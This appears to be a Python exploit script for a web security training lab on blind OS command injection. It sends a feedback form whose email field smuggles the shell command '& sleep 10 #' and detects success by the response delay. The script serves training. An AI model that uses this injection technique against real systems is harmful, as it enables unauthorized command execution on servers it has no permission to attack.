# Lab: Blind OS command injection with time delays
# This script injects a linux command in the product stock request
import sys
import urllib3
import requests
import os
from bs4 import BeautifulSoup
from dotenv import load_dotenv

load_dotenv()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT"),
}


def get_csrf_token(s, url):
    path = "/feedback"
    r = s.get(url + path, verify=False, proxies=proxies)

    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = soup.find(name="csrf")
    if csrf_token:
        return csrf_token
    else:
        print("(-) Couldn't find csrf token")


def os_command_injection(s, url):
    stock_path = "/feedback/submit"
    command_injection = "1337@1337.org & sleep 10 #"
    csrf = " "
    data = {"csrf": csrf, "name": '1', "email": command_injection, "subject": "adafa", "message": "gsgsg"}
    r = s.post(url + stock_path, data=data, verify=False, proxies=proxies)

    if r.elapsed.total_seconds() > 9:
        print("(-> Injection successfully executed !")
    else:
        print(f"(-) Could not execute {command_injection} injection")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(-> Usage: %s <url>" % sys.argv[0])
        print("(-> Example: %s www.example.com " % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(-> Blind OS command injection with time delays...")
    s = requests.Session()
    os_command_injection(s, url)


if __name__ == "__main__":
    main()
